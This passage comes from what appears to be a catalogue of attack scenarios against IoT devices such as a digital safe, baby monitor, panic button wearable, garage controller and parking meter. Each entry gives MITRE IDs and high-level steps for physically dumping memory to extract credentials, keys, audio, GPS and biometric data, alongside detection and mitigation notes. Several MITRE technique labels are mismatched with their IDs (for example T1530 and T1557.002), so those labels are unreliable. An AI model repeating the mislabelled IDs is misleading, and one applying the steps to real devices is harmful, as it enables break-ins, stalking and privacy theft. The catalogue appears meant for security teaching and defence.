- **Attack Steps**: Step 1: Disassemble the coffee machine to find EEPROM.Step 2: Connect EEPROM reader via clip.Step 3: Dump the memory into a .bin file.Step 4: Analyze binary in hex editor.Step 5: Decode scheduling patterns, user IDs, and coffee preferences using Python.Step 6: Modify firmware to simulate privilege escalation (e.g., admin mode).
- **Detection**: Schedule anomalies
- **Solution**: Secure enclave or session isolation
- **Tags**: coffee, EEPROM, schedule

## Digital Safe Controller Dump to Bypass Authentication

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Digital Safe
- **Vulnerability**: Insecure debug access; logic not obfuscated
- **MITRE**: T1601: Modify System Image
- **Impact**: Safe unlock bypass
- **Tools**: SWD Debugger (ST-Link), STM32CubeProgrammer, Ghidra
- **Scenario**: Safe’s microcontroller flash is dumped to recover and bypass stored unlock sequences.
- **Attack Steps**: Step 1: Remove the safe’s digital controller board.Step 2: Identify SWDIO and SWCLK pins on the MCU.Step 3: Connect ST-Link to SWD interface.Step 4: Use STM32CubeProgrammer to read flash.Step 5: Analyze firmware in Ghidra and search for hardcoded unlock logic.Step 6: Modify or simulate correct sequence to trigger open function.Step 7: Replay logic in safe emulator.
- **Detection**: Unexpected firmware read alert
- **Solution**: Disable debug; use code signing
- **Tags**: safe, SWD, bypass code

## Environmental Sensor Dump via UART

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Environment Sensor
- **Vulnerability**: Unauthenticated shell access
- **MITRE**: T1003: OS Credential Dumping
- **Impact**: Data manipulation or weather spoofing
- **Tools**: USB-UART Adapter, Terminal Emulator, Strings Tool
- **Scenario**: A weather/environment sensor is stolen and accessed via UART to extract sensor logs and configuration.
- **Attack Steps**: Step 1: Open casing and locate UART pinouts (TX/RX/GND).Step 2: Connect USB-UART adapter and open terminal.Step 3: Try common baud rates until readable output appears.Step 4: Log into root shell if no password is set.Step 5: Dump /etc, /logs, or other directories to capture data.Step 6: Save logs for review and simulation of tampered data.
- **Detection**: Serial port access detection
- **Solution**: Disable shell; secure boot
- **Tags**: UART, sensor, config dump

## Smart Doorbell NAND Dump for Image History

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Doorbell
- **Vulnerability**: Video/image logs not encrypted
- **MITRE**: T1125: Video Capture
- **Impact**: Privacy breach; identity exposure
- **Tools**: NAND Reader, Binwalk, Image Viewer
- **Scenario**: NAND dump from smart doorbell retrieves old visitor photos and user profiles.
- **Attack Steps**: Step 1: Unplug and dismantle the doorbell.Step 2: Identify and desolder the NAND flash.Step 3: Dump using NAND reader.Step 4: Run Binwalk and extract filesystem.Step 5: Locate image or video files and open in Image Viewer.Step 6: Simulate privacy breach through stored images.Step 7: Educate on the importance of data sanitization.
- **Detection**: Video size and timestamp monitoring
- **Solution**: Auto-deletion; encryption at rest
- **Tags**: doorbell, NAND, image dump

## Parking Sensor Controller Flash Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Parking Sensor
- **Vulnerability**: Unencrypted configuration file
- **MITRE**: T1602: Configuration Repository
- **Impact**: Sensor spoofing; DoS
- **Tools**: Flash Dump Tool, Hex Editor, Notepad++
- **Scenario**: Dumping parking sensor controller reveals configuration and pairing to external sensors.
- **Attack Steps**: Step 1: Remove parking controller from dashboard.Step 2: Identify flash chip and dump via reader.Step 3: Open dump in hex editor.Step 4: Search for key config files or sensor ID tables.Step 5: Modify data to simulate sensor spoofing.Step 6: Replay pairing process with forged sensors.
- **Detection**: Unexpected re-pairing events
- **Solution**: Use secure pairing methods
- **Tags**: parking, spoofing, sensor dump

## Electronic Shelf Label (ESL) Dump for Inventory Data

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Shelf Label
- **Vulnerability**: Data not encrypted or signed
- **MITRE**: T1557.002: Network Sniffing
- **Impact**: Inventory tampering; pricing fraud
- **Tools**: EEPROM Reader, RF Sniffer, Notepad++
- **Scenario**: Dumping EEPROM of smart shelf label reveals SKU, price, and wireless pairing data.
- **Attack Steps**: Step 1: Open ESL device and access EEPROM chip.Step 2: Dump contents using reader.Step 3: Analyze for product codes, prices, and timestamps.Step 4: Cross-reference with sniffer-captured radio packets for full control simulation.Step 5: Demonstrate how attacker can spoof prices on test display.
- **Detection**: Packet anomaly detection
- **Solution**: Data signing and checksum
- **Tags**: shelf label, EEPROM, spoof

## Smart Helmet Sensor Dump for Crash Data

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Helmet
- **Vulnerability**: Impact logs stored unencrypted
- **MITRE**: T1119: Automated Collection
- **Impact**: Privacy violation; data breach
- **Tools**: Flash Reader, Hex Editor, SQLite Browser
- **Scenario**: Memory dump from smart helmet retrieves impact logs, location, and rider ID.
- **Attack Steps**: Step 1: Dismantle smart helmet and locate flash storage.Step 2: Dump the flash using reader.Step 3: Use SQLite Browser to open log or profile database.Step 4: Review crash logs, user details, and GPS traces.Step 5: Simulate how attackers might abuse sensitive incident logs.
- **Detection**: Log access timestamping
- **Solution**: Use secure logging; encrypt GPS
- **Tags**: helmet, GPS, SQLite, logs

## Smart Mirror Flash Dump for User Behavior Logs

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Mirror
- **Vulnerability**: Logs stored in plaintext without encryption
- **MITRE**: T1213.003: Data from Information Repositories
- **Impact**: Privacy breach; behavioral profiling
- **Tools**: SPI Flash Reader, Binwalk, SQLite Browser, Hex Editor
- **Scenario**: Attacker removes the mainboard from a smart mirror to dump logs of usage patterns and personalized data.
- **Attack Steps**: Step 1: Remove the casing of the smart mirror and access the control board.Step 2: Identify the SPI flash chip and connect using a SOIC-8 clip.Step 3: Dump the firmware using flashrom.Step 4: Use Binwalk to extract file system content.Step 5: Search for SQLite databases or .json log files.Step 6: Analyze data for user behavior (e.g., calendar sync, daily routine timings).Step 7: Simulate privacy invasion by showing how logs could track user activity.
- **Detection**: Log timestamp audit
- **Solution**: Encrypt logs; anonymize stored data
- **Tags**: mirror, flash, logs, behavior

## Bike GPS Tracker Dump to Steal Routes

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: GPS Tracker
- **Vulnerability**: GPS logs stored unencrypted
- **MITRE**: T1114: Email Collection / T1213.003
- **Impact**: User tracking, physical safety risk
- **Tools**: EEPROM Reader, GPS Parser Script, Hex Editor
- **Scenario**: A GPS-enabled bike tracker is dumped to recover past routes, times, and pairing to user accounts.
- **Attack Steps**: Step 1: Remove tracker from bike and open casing.Step 2: Locate EEPROM (usually 8-pin) and connect reader.Step 3: Dump memory and look for GPS logs using hex editor or GPS parser.Step 4: Convert raw GPS coordinates into map format using script.Step 5: Reveal location history, speeds, and timestamps.Step 6: Simulate stalking or surveillance attack in lab.
- **Detection**: Unusual device pairing alerts
- **Solution**: Encrypt and store logs in volatile memory only
- **Tags**: GPS, EEPROM, route theft

## HVAC System Controller Dump for Config Hijack

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: HVAC Controller
- **Vulnerability**: Configs stored without integrity checks
- **MITRE**: T1601.001: Modify System Firmware
- **Impact**: Environmental disruption, sabotage
- **Tools**: SPI Programmer, Flash Dump Tool, Binwalk, Config Parser
- **Scenario**: HVAC control system is opened and flash dumped to extract critical config (temperatures, modes, zones).
- **Attack Steps**: Step 1: Power off the HVAC unit and remove its controller.Step 2: Access the flash chip and connect programmer.Step 3: Dump firmware to .bin file.Step 4: Use Binwalk to extract settings or plain-text config files.Step 5: Locate and modify target zones and temperature thresholds.Step 6: Replay modified firmware in test HVAC for simulation.Step 7: Discuss sabotage possibilities or blackmail scenarios.
- **Detection**: HVAC anomaly alerts
- **Solution**: Use checksum and secure boot
- **Tags**: HVAC, config, firmware dump

## Smart Trash Bin Dump for Sensor History

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Bin
- **Vulnerability**: Sensor logs stored as plain strings
- **MITRE**: T1213.003: Data from Information Repositories
- **Impact**: Exposure of user activity and urban schedule
- **Tools**: EEPROM Reader, Hex Editor, Data Parser Script
- **Scenario**: Dumping a smart bin's memory reveals waste data logs, pickup times, and possible location tags.
- **Attack Steps**: Step 1: Disassemble bin and locate EEPROM near the controller.Step 2: Dump memory using an EEPROM reader.Step 3: Search for strings like “full=true” or timestamps.Step 4: Recreate a log timeline showing disposal patterns.Step 5: Simulate privacy exposure in smart city test.Step 6: Discuss urban surveillance implications.
- **Detection**: Data access audit logs
- **Solution**: Encrypt waste records; limit retention
- **Tags**: trash bin, sensor, logs

## Baby Crib Monitor Dump for Audio Logs

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Baby Crib Monitor
- **Vulnerability**: Audio cache saved locally
- **MITRE**: T1123: Audio Capture
- **Impact**: Child privacy breach
- **Tools**: NAND Reader, Binwalk, Audacity, Notepad++
- **Scenario**: Flash dump of baby monitor reveals stored audio recordings and login credentials.
- **Attack Steps**: Step 1: Open device casing and remove NAND flash chip.Step 2: Use NAND reader to extract memory.Step 3: Run Binwalk to unpack data.Step 4: Search for WAV or MP3 file headers.Step 5: Extract and play audio logs with Audacity.Step 6: Also look for saved login info (admin password).Step 7: Simulate remote monitoring abuse.
- **Detection**: Unexpected storage changes
- **Solution**: Encrypt voice data; auto-delete
- **Tags**: baby monitor, audio, dump

## Wearable Panic Button Dump for Incident Logs

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Panic Button Wearable
- **Vulnerability**: Panic logs stored without encryption
- **MITRE**: T1119: Automated Collection
- **Impact**: Risk of re-victimization, stalking
- **Tools**: EEPROM Reader, GPS Decoder Tool, Hex Editor
- **Scenario**: A panic button’s memory is dumped to recover button press timestamps and geolocation data.
- **Attack Steps**: Step 1: Open casing of wearable and locate EEPROM.Step 2: Connect clip and dump memory to binary file.Step 3: Search for patterns like panic=true or GPS strings.Step 4: Use decoder script to extract lat-long info.Step 5: Map past incidents on GPS software.Step 6: Demonstrate profiling or stalking simulation.
- **Detection**: Trigger monitoring system
- **Solution**: Secure, hashed logs; minimal retention
- **Tags**: panic button, GPS logs

## Fitness Bike Console Dump for User Biometrics

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Fitness Bike Console
- **Vulnerability**: Health metrics stored locally
- **MITRE**: T1213.003: Data from Information Repositories
- **Impact**: Exposure of biometric and fitness logs
- **Tools**: SPI Flash Reader, Binwalk, CSV Viewer
- **Scenario**: Dump from indoor fitness bike reveals user profiles, heart rate logs, and workout sessions.
- **Attack Steps**: Step 1: Access the console’s control board.Step 2: Connect SPI reader and extract firmware.Step 3: Run Binwalk and look for .csv or .json files.Step 4: Analyze using CSV viewer to reveal HR, speed, workout logs.Step 5: Simulate profiling for insurance, marketing, or stalking.
- **Detection**: File access frequency monitoring
- **Solution**: Encrypt logs; cloud-only processing
- **Tags**: fitness bike, biometrics

## Smart Fire Alarm Flash Dump for Network Info

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Fire Alarm
- **Vulnerability**: MQTT and Wi-Fi info stored insecurely
- **MITRE**: T1552.001: Credentials in Files
- **Impact**: Fake alert injection or suppression
- **Tools**: Flash Dump Tool, Strings, MQTT Client
- **Scenario**: Dumping smart fire alarm’s memory reveals Wi-Fi config and MQTT broker keys.
- **Attack Steps**: Step 1: Open fire alarm device and locate flash chip.Step 2: Connect clip and dump contents.Step 3: Use strings to locate SSID, passwords, and mqtt:// endpoints.Step 4: Replay credentials in MQTT client to simulate message interception.Step 5: Demonstrate control over fire notification topic.
- **Detection**: MQTT topic behavior monitor
- **Solution**: Encrypt and rotate MQTT keys
- **Tags**: fire alarm, mqtt, flash

## Smart School ID Dump for Student Info

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Student ID
- **Vulnerability**: Student info stored without auth
- **MITRE**: T1530: Data from Local System
- **Impact**: Identity spoofing, fake attendance
- **Tools**: EEPROM Reader, ID Format Decoder, Text Editor
- **Scenario**: Dump of a digital student ID card reveals identity info and recent scan logs.
- **Attack Steps**: Step 1: Open card shell and connect reader to EEPROM.Step 2: Dump memory and decode with known ID format.Step 3: Extract student ID, class info, attendance logs.Step 4: Simulate misuse in test scenario (fake check-in).Step 5: Discuss data minimization policy gaps.
- **Detection**: Device presence monitoring
- **Solution**: Limit on-device data; secure enclave
- **Tags**: school ID, dump, student data

## Smart Garage Door Controller Dump for Key Replay

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Garage Controller
- **Vulnerability**: Replayable fixed unlock codes
- **MITRE**: T1557.003: Transitive Access
- **Impact**: Unauthorized physical access
- **Tools**: Flash Reader, Hex Editor, RF Replay Device
- **Scenario**: Attacker dumps memory from garage controller and recovers rolling codes or unlock tokens.
- **Attack Steps**: Step 1: Dismantle the garage controller.Step 2: Identify flash chip and dump using SPI reader.Step 3: Search for rolling code algorithm or fixed unlock token.Step 4: Replay using SDR (Software Defined Radio) or IR/RF emulator.Step 5: Simulate unauthorized entry in test lab.Step 6: Demonstrate how static keys are a threat.
- **Detection**: Signal anomaly detection
- **Solution**: Use non-replayable rolling tokens
- **Tags**: garage, dump, rolling code

## Smart Medical Pill Dispenser Memory Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Pill Dispenser
- **Vulnerability**: Medical data stored unencrypted
- **MITRE**: T1213.003: Data from Information Repositories
- **Impact**: Privacy violation; health data exposure
- **Tools**: SPI Flash Reader, Binwalk, CSV Viewer, Hex Editor
- **Scenario**: A smart pill dispenser is stolen and memory is dumped to recover medication schedules, patient identity, and reminders.
- **Attack Steps**: Step 1: Power down and open the smart pill dispenser casing.Step 2: Identify the SPI flash memory chip (usually 8-pin) near the MCU.Step 3: Connect SOIC clip and SPI reader to extract memory using flashrom.Step 4: Use Binwalk to extract the filesystem.Step 5: Locate .csv or .json logs containing patient ID, scheduled pills, and timestamps.Step 6: Open logs in CSV Viewer to show structured patient medication schedule.Step 7: Simulate privacy breach or social engineering attack.
- **Detection**: Log access audit and alerts
- **Solution**: Encrypt patient logs; store minimum data
- **Tags**: medical device, pill, CSV

## Smart TV Remote Dump for Voice Command Logs

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart TV Remote
- **Vulnerability**: Voice logs saved in raw format
- **MITRE**: T1123: Audio Capture
- **Impact**: Replay attack; behavioral tracking
- **Tools**: Flash Reader, Binwalk, Audacity, Hex Editor
- **Scenario**: Flash memory is dumped from a smart TV remote with voice recognition to reveal stored voice queries and device pairing keys.
- **Attack Steps**: Step 1: Dismantle the smart remote and access the flash memory.Step 2: Connect flash reader and dump firmware.Step 3: Use Binwalk to extract file system and search for WAV or AMR files.Step 4: Open audio files with Audacity and replay recorded voice commands.Step 5: Search for device pairing tokens or app sync data.Step 6: Simulate session hijacking by replaying tokens or analyzing behavior.
- **Detection**: Voice log length audit
- **Solution**: Encrypt audio and auto-wipe after sync
- **Tags**: smart remote, voice, dump

## Smart Agriculture Sensor Dump for Field Data

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Soil Sensor
- **Vulnerability**: Critical data stored without encryption or signing
- **MITRE**: T1602: Modify Configuration
- **Impact**: Crop sabotage; yield disruption
- **Tools**: EEPROM Reader, Hex Editor, Python Decoder
- **Scenario**: Dumped memory of a smart soil sensor reveals field fertility data, irrigation schedules, and base station keys.
- **Attack Steps**: Step 1: Disconnect and disassemble the soil sensor.Step 2: Connect EEPROM reader to the onboard chip.Step 3: Dump memory to .bin file.Step 4: Use Hex Editor or Python script to search for strings like moisture=, crop_type=, or timestamps.Step 5: Extract irrigation schedule, field zone data, and LoRaWAN pairing keys.Step 6: Simulate a data manipulation attack by injecting false values or duplicating the sensor.
- **Detection**: Sensor config audit
- **Solution**: Encrypted, signed configs and sync-only logging
- **Tags**: agri-sensor, EEPROM, field data

## Smart Attendance Terminal Dump for Biometric Data

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Fingerprint Attendance System
- **Vulnerability**: Biometric data stored insecurely
- **MITRE**: T1119: Automated Collection
- **Impact**: Identity spoofing; compliance risk
- **Tools**: SPI Flash Reader, Binwalk, Hex Editor, Biometric Viewer
- **Scenario**: Flash dump from a fingerprint-based attendance machine reveals biometric hash templates and attendance logs.
- **Attack Steps**: Step 1: Power off the device and access internal memory chip.Step 2: Connect SPI reader and dump firmware.Step 3: Use Binwalk to extract filesystems.Step 4: Look for .dat, .bin, or proprietary biometric template files.Step 5: Parse attendance logs and map to employee IDs.Step 6: Demonstrate cloning or spoofing of fingerprint templates in test biometric emulator.
- **Detection**: Device log monitoring
- **Solution**: Use encrypted biometric template formats
- **Tags**: biometric, attendance, spoof

## Smart Parking Meter Dump for Payment Logs

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Parking Meter
- **Vulnerability**: Payment logs stored in unprotected format
- **MITRE**: T1074.001: Local Data Staging
- **Impact**: Payment fraud; surveillance
- **Tools**: Flash Dump Tool, SQLite Browser, Hex Editor
- **Scenario**: A parking meter is disassembled and internal memory is dumped to extract card logs, payment times, and user history.
- **Attack Steps**: Step 1: Open smart meter and locate onboard storage chip (SPI or SD card).Step 2: Dump contents using a flash reader or card reader.Step 3: Use SQLite Browser to open logs, which include transaction timestamps, partial PAN (card number), and vehicle IDs.Step 4: Simulate profiling or fraudulent refund scenario.Step 5: Show how transaction replays could be done if secure keys are missing.
- **Detection**: Transaction replay detection
- **Solution**: Encrypt logs; anonymize partial data
- **Tags**: smart meter, payment logs

